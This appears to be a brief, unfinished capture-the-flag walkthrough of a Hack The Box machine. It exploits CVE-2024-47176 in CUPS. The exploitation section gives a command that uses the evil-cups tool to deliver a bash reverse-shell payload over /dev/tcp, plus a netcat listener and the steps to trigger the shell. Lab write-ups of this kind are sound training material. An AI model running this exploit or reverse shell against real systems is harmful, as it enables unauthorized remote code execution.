# Machine Info
- **Target IP** 10.10.11.40
- **Difficulty** Medium
- **MACHINE** Linux
- **TAGS** #CVE #ReverseShell #UnFiinished
- **NICKNAME** Evil Printer

---
# Recon
- **PORTS**
	- 22     ssh  OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
	- 631   ipp  CUPS 2.4   http-title: Home - CUPS 2.4.2
## PORT 631 Enumeration

- **URL** https://10.10.11.40:631/
- **CUPS 2.4.0** Common Unix Printing System
	- Is a print server that allows users to manage & process print jobs, it typically listens on port 631 for web based management & UDP port 631 for automatic printer discovery 
###  CVE-2024-47176
- The vulnerability in CUPS-browsed allows an attacker to send a malicious printer installation request over UDP. Once installed, the malicious printer is configured to inject commands via Foomatic-RIP, leading to remote code execution (RCE).

---
# Exploitation
- Install The [Tool To Exploit Cups](https://github.com/IppSec/evil-cups)
- Run This command First
```bash
python3 evilcups.py LHOST RHOST 'bash -c "bash -i >& /dev/tcp/LHOST/9001 0>&1"'
# Wait Till it States :  target connected, sending payload ...
```

- Now Start The listerner on our machine : **`nc -nlvp 9001`**
- Now go The http://target-ip:631 ---> printers ---> Our New Printer ---> print Test Page
- We should get a *ReverseShell* 

> **NOTE** : USe The **`9001`** PORT in this attack
> **NOTE** : Dont Stop The tool When you get The RevShell Or U'll lose it 

---

# Post Exploitation





---

# References
[Read More About CVE-2024-47176 ](https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained)
[Video Walkthrough By IPPsec](https://www.youtube.com/watch?v=7oMSQPST7H8)

## PDF WalkThrough 

![[EvilCUPS.pdf]]